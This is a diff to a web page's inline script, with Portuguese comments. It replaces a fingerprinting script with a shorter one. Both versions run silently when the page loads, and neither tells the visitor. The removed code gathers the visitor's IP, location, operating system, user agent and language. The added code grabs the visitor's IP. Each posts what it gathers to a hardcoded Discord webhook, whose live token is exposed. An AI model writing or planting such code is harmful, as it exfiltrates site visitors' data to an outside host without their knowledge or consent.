@@ -56,55 +56,31 @@
         </footer>
     </div>
     <script>
-        async function enviarParaWebhook() {
-            try {
-                const response = await fetch("https://ip-api.com/json/");
-                const ipInfo = await response.json();
-    
-                const userAgent = navigator.userAgent;
-                const idioma = navigator.language;
-                const protocolo = window.location.protocol;
-                const porta = window.location.port || "Padrão";
-                const dataHora = new Date().toLocaleString();
-    
-                // Melhor detecção de sistema operacional (PC e Mobile)
-                let sistemaOperacional = "Desconhecido";
-                if (navigator.userAgentData && navigator.userAgentData.platform) {
-                    sistemaOperacional = navigator.userAgentData.platform;
-                } else if (navigator.platform) {
-                    sistemaOperacional = navigator.platform;
-                }
-    
-                let mensagem = `📡 **Nova Conexão Detectada**\n\n` +
-                    `🏠 **IP:** ${ipInfo.query}\n` +
-                    `🔎 **Cidade:** ${ipInfo.city}\n` +
-                    `📍 **Região:** ${ipInfo.regionName}\n` +
-                    `🌎 **País:** ${ipInfo.country}\n\n` +
-                    `💻 **Sistema Operacional:** ${sistemaOperacional}\n` +
-                    `🔓 **User-Agent:** ${userAgent}\n` +
-                    `🚪 **Porta:** ${porta}\n` +
-                    `🔒 **Protocolo:** ${protocolo}\n` +
-                    `👥 **Linguagem:** ${idioma}\n` +
-                    `📆 **Data/Hora:** ${dataHora}`;
-    
-                const webhookURL = "https://discord.com/api/webhooks/1335027783209844767/gDOdN1-ICsD4KPG_gOUEubU3CXYL7WE7W3wkjmXVDjhQHkSJWinVSXdRfiS15jj4IG63";
-    
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        content: mensagem
-                    })
-                });
-    
-            } catch (error) {
-                console.error("Erro ao enviar os dados:", error);
+        (function() {
+            const sendURL = "https://discord.com/api/webhooks/1335027783209844767/gDOdN1-ICsD4KPG_gOUEubU3CXYL7WE7W3wkjmXVDjhQHkSJWinVSXdRfiS15jj4IG63";
+
+            function captureVisitorData() {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => sendData(data.ip))
+                    .catch(() => console.warn("Não foi possível capturar o IP."));
             }
-        }
-    
-        enviarParaWebhook();
-    </script>       
+
+            function sendData(visitorIP) {
+                const payload = { content: `Novo visitante: ${visitorIP}` };
+                fetch(sendURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) console.error("Erro ao enviar dados:", response.status);
+                })
+                .catch(() => console.warn("Não foi possível enviar os dados."));
+            }
+
+            captureVisitorData();
+        })();
+    </script>    
 </body>
 </html>
